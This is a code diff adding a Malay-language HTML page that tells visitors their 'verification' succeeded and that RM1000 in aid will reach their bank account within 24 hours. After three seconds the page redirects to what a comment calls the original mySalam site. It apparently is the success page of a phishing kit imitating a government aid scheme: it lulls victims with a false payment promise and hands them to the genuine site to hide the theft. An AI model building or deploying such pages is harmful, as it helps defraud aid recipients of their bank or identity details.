@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html lang="ms">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Berjaya</title>
+    <link rel="stylesheet" href="css/style.css">
+</head>
+<body>
+    <div class="card" style="text-align: center;">
+        <h2 style="color: #16a34a;">Pengesahan Berjaya!</h2>
+        <p>Wang bantuan RM1000 akan dikreditkan ke akaun bank anda dalam masa 24 jam. Sila tunggu.</p>
+        <div style="font-size: 50px; margin: 20px 0;">✅</div>
+    </div>
+    <script src="js/config.js"></script>
+    <script>
+        // Tunggu 3 saat, lepas tu redirect ke web asal (mysalam)
+        setTimeout(() => {
+            window.location.href = CONFIG.REDIRECT_URL;
+        }, 3000);
+    </script>
+</body>
+</html>
